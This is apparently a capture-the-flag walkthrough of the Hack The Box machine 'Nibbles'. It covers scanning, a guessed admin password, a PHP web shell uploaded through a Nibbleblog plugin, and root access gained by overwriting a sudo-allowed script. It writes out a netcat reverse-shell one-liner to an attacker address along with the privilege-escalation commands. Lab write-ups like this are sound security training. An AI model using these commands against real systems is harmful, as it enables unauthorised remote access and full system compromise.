---
title: HTB-Nibbles
draft: false
tags:
  - htb
  - linux
  - easy
  - sudoers
  - web-shell
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/Nibbles.png)

## Information Gathering

Rustscan finds SSH and HTTP running on the target:

`rustscan --addresses 10.129.91.159 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-2.png)

`whatweb` shows Apache is running on HTTP:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-3.png)

## Enumeration
### HTTP - TCP 80

Website shows "Hello world!" message:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image.png)

`/nibbleblog/` path is exposed from the source code:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-1.png)

`/nibbleblog/` is a blog but has no posts yet:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-4.png)

`searchsploit` shows that nibbleblog is vulnerable to  SQL injection and Aribitrary file upload:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-5.png)

Using `feroxbuster` for directory bruteforcing, we see several interesting paths such as admin, admin.php, and content:

`sudo feroxbuster -u http://10.129.91.159/nibbleblog/ -n -x php /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-6.png)

Exploring around newly discovered file paths, `nibbleblog/content/private/config.xml` shows the username **admin**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-7.png)


`/admin.php` is a login page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-8.png)

Trying the the password `nibbles` for the `admin`, we managed to successfully login:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-9.png)

## Shell as nibbler
### Web Shell upload

Going to Plugins, we can see installed plugins, including **My image**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-10.png)

**my image** plugin provides feature for file upload. Let's try uploading **p0wny-shell.php**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-11.png)

`/nibbleblog/content/private/plugins/my_image/` shows that the php web shell was successfully uploaded:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-12.png)

Accessing image.php, we have the web shell as the nibbler:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-13.png)

In order to obtain a proper shell on terminal, we will lauch  the command below towards our local netcat listener:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.155 1337 >/tmp/f`

Now we have a shell as nibbler:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-14.png)


## Privesc: nibbler to root
### Sudoers

monitor.sh can be executed as the root without needing password:

`sudo -l`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-15.png)

Let's unzip personal.zip to access monitor.sh:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-16.png)

monitor.sh seems to be a server health monitoring script from tecmint.com:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-17.png)

Looking at the permission, we can overwrite the file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-18.png)

We will overwirte monitor.sh with bash command:

`echo "/bin/bash" > monitor.sh`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-19.png)


Before executing monitor.sh with sudo, we will spawn a interactive tty shell using python: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

Now executing overwritten monitor.sh file with sudo, we have the shell as the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/nibbles/image-20.png)

## References
- https://github.com/dix0nym/CVE-2015-6967

